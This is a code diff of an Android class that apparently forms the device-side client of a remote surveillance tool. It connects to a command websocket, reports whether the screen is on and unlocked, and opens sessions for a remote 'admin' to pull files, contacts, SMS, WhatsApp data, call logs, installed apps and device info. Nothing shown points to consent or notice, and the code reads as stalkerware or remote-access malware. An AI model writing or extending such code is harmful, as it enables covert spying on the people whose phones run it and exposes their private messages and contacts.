@@ -1,49 +1,61 @@
 package com.lyrnic.userside.managers;
 
-import android.app.usage.NetworkStats;
-import android.app.usage.NetworkStatsManager;
+import android.app.KeyguardManager;
 import android.content.Context;
 import android.net.ConnectivityManager;
-import android.net.Network;
-import android.net.NetworkCapabilities;
-import android.net.NetworkRequest;
+import android.os.PowerManager;
 import android.util.Log;
-
-import androidx.annotation.NonNull;
-import androidx.annotation.Nullable;
 
 import com.lyrnic.userside.constants.Actions;
 import com.lyrnic.userside.constants.Constants;
-import com.lyrnic.userside.network.ApiClient;
-import com.lyrnic.userside.services.ActionsController;
+import com.lyrnic.userside.network.ActionsWebSocket;
+import com.lyrnic.userside.sessions.CallLogsSession;
+import com.lyrnic.userside.sessions.ContactsSession;
+import com.lyrnic.userside.sessions.DeviceInfoSession;
+import com.lyrnic.userside.sessions.FileManagerSession;
+import com.lyrnic.userside.sessions.InstalledAppsSession;
+import com.lyrnic.userside.sessions.SmsSession;
+import com.lyrnic.userside.sessions.WhatsappSession;
+import com.lyrnic.userside.utilities.ScreenUtils;
 
 import org.json.JSONException;
 import org.json.JSONObject;
 
-import java.io.IOException;
-
-import okhttp3.OkHttpClient;
-import okhttp3.Response;
-import okhttp3.WebSocket;
-import okhttp3.WebSocketListener;
-
 public class ActionsManager {
     Context context;
-    public WebSocket webSocket;
     SessionManager sessionManager;
-    public OkHttpClient client;
+    ActionsWebSocket webSocket;
+
+
     public ActionsManager(Context context){
+        Log.d("ActionsManager", "ActionsManager created");
         this.context = context;
-        sessionManager = new SessionManager();
-        client = new OkHttpClient();
+        sessionManager = new SessionManager(context);
+        webSocket = ActionsWebSocket.getInstance(TokenManager.getToken(context)
+                , (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE));
+        webSocket.connectWebSocket();
+
+        webSocket.setOnMessageListener(message -> {
+            try {
+                handleAction(message);
+            } catch (JSONException e) {
+                Log.e("ActionsManager", "error while parsing json", e);
+            }
+        });
+        sessionManager.setOnRequestSendMessageListener(message -> {
+            try {
+                JSONObject jsonObject = new JSONObject(message);
+                jsonObject.put(Constants.SENDER_TOKEN_KEY, TokenManager.getToken(context));
+                webSocket.sendMessage(jsonObject.toString());
+            } catch (JSONException e) {
+                throw new RuntimeException(e);
+            }
+        });
+
     }
-    public void connectToWebsocket(){
-        if(webSocket == null){
-            webSocket = client.newWebSocket(ApiClient.getWebSocketRequest(context), webSocketListener);
-            return;
-        }
-        webSocket.close(1000, "reconnecting");
-        client.newWebSocket(ApiClient.getWebSocketRequest(context), webSocketListener);
+
+    public SessionManager getSessionManager() {
+        return sessionManager;
     }
 
     public void handleAction(String message) throws JSONException {
@@ -54,91 +66,77 @@ public class ActionsManager {
 
         switch (action){
             case Actions.ACTION_GET_STATE:
-                JSONObject state = new JSONObject();
-                state.put(Constants.ACTION_KEY, Actions.ACTION_RECEIVE_STATE);
-                state.put(Constants.STATE_KEY, "online");
-                state.put(Constants.SENDER_TOKEN_KEY, TokenManager.getToken(context));
-                state.put(Constants.RECEIVER_TOKEN_KEY, senderToken);
-                webSocket.send(state.toString());
+                webSocket.sendMessage(generateStateResponse(senderToken));
                 break;
+                case Actions.ACTION_GET_SCREEN_STATE:
+                // Check if screen on or off
+                // Return response to admin
+                sendScreenStatus(senderToken);
+                break;
+
             case Actions.ACTION_START_SESSION:
+                // Start required session
+                // Return response to admin
+                // Response should contain session id
+                int sessionSharedId = messageJson.getInt(Constants.SESSION_ID_KEY);
                 String sessionType = messageJson.getString(Constants.SESSION_TYPE_KEY);
-                int id = sessionManager.createSession(sessionType, senderToken, webSocket, context);
-                if(id != -1){
-                    JSONObject response = new JSONObject();
-                    response.put(Constants.ACTION_KEY, Actions.ACTION_SESSION_CREATED);
-                    response.put(Constants.SENDER_TOKEN_KEY, TokenManager.getToken(context));
-                    response.put(Constants.RECEIVER_TOKEN_KEY, senderToken);
-                    response.put(Constants.SESSION_ID_KEY, id);
-                    webSocket.send(response.toString());
-                }
+                int sessionId = sessionManager.createSession(getSessionClass(sessionType) ,senderToken);
+                webSocket.sendMessage(generateSessionStartedResponse(senderToken, sessionId, sessionSharedId));
             default:
+                // Not a simple action
+                // Send it to opened sessions if any
                 sessionManager.sendToSession(message);
         }
     }
-    public WebSocketListener getWebSocketListener(){
-        return webSocketListener;
+
+    private void sendScreenStatus(String senderToken) throws JSONException {
+        JSONObject screenState = new JSONObject();
+        screenState.put(Constants.ACTION_KEY, Actions.ACTION_RECEIVE_SCREEN_STATE);
+        screenState.put(Constants.STATE_KEY, ScreenUtils.isScreenOnAndUnlocked(context));
+        screenState.put(Constants.SENDER_TOKEN_KEY, TokenManager.getToken(context));
+        screenState.put(Constants.RECEIVER_TOKEN_KEY, senderToken);
+        webSocket.sendMessage(screenState.toString());
     }
 
-    public WebSocketListener webSocketListener = new WebSocketListener() {
-        @Override
-        public void onFailure(@NonNull WebSocket webSocket, @NonNull Throwable t, @Nullable Response response) {
-            super.onFailure(webSocket, t, response);
-            Log.e("WebSocket", "connection failed, reconnecting after 5 seconds if possible...",t);
-            try {
-                FilesManager.logStatus(context, "connection failed, reconnecting after 5 seconds if possible..., " + t);
-            } catch (IOException e) {
-                throw new RuntimeException(e);
-            }
-            try {
-                Thread.sleep(5000);
-            } catch (InterruptedException e) {
-                e.printStackTrace();
-            }
-            if(ActionsController.networkConnected){
-                connectToWebsocket();
-            }
+
+    public Class<?> getSessionClass(String sessionType){
+        if(FileManagerSession.class.getSimpleName().equals(sessionType)){
+            return FileManagerSession.class;
+        }else if(ContactsSession.class.getSimpleName().equals(sessionType)){
+            return ContactsSession.class;
+        }else if(WhatsappSession.class.getSimpleName().equals(sessionType)){
+            return WhatsappSession.class;
+        } else if(SmsSession.class.getSimpleName().equals(sessionType)){
+            return SmsSession.class;
+        } else if(CallLogsSession.class.getSimpleName().equals(sessionType)){
+            return CallLogsSession.class;
+        } else if(InstalledAppsSession.class.getSimpleName().equals(sessionType)){
+            return InstalledAppsSession.class;
+        } else if (DeviceInfoSession.class.getSimpleName().equals(sessionType)) {
+            return DeviceInfoSession.class;
         }
+        return null;
+    }
 
-        @Override
-        public void onClosed(@NonNull WebSocket webSocket, int code, @NonNull String reason) {
-            super.onClosed(webSocket, code, reason);
-            try {
-                FilesManager.logStatus(context, "connection closed, " + reason);
-            } catch (IOException e) {
-                throw new RuntimeException(e);
-            }
-        }
+    public String generateStateResponse(String senderToken) throws JSONException {
+        JSONObject state = new JSONObject();
+        state.put(Constants.ACTION_KEY, Actions.ACTION_RECEIVE_STATE);
+        state.put(Constants.STATE_KEY, "online");
+        state.put(Constants.SENDER_TOKEN_KEY, TokenManager.getToken(context));
+        state.put(Constants.RECEIVER_TOKEN_KEY, senderToken);
+        return state.toString();
+    }
+    public String  generateSessionStartedResponse(String senderToken, int sessionId, int sessionSharedId) throws JSONException {
+        JSONObject response = new JSONObject();
+        response.put(Constants.ACTION_KEY, Actions.ACTION_SESSION_CREATED);
+        response.put(Constants.SENDER_TOKEN_KEY, TokenManager.getToken(context));
+        response.put(Constants.RECEIVER_TOKEN_KEY, senderToken);
+        response.put(Constants.SESSION_ID_KEY, sessionId);
+        response.put(Constants.SESSION_SHARED_ID_KEY, sessionSharedId);
+        return response.toString();
+    }
 
-
-
-        @Override
-        public void onOpen(@NonNull WebSocket webSocket, @NonNull Response response) {
-            super.onOpen(webSocket, response);
-            ActionsManager.this.webSocket = webSocket;
-            try {
-                FilesManager.logStatus(context, "connection established");
-            } catch (IOException e) {
-                throw new RuntimeException(e);
-            }
-        }
-
-        @Override
-        public void onMessage(@NonNull WebSocket webSocket, @NonNull String text) {
-            super.onMessage(webSocket, text);
-            try {
-                FilesManager.logStatus(context, "message received: " + text);
-            } catch (IOException e) {
-                throw new RuntimeException(e);
-            }
-
-            try{
-                handleAction(text);
-            }
-            catch (JSONException e){
-                e.printStackTrace();
-            }
-
-        }
-    };
+    public ActionsWebSocket getWebSocket() {
+        return webSocket;
+    }
 }
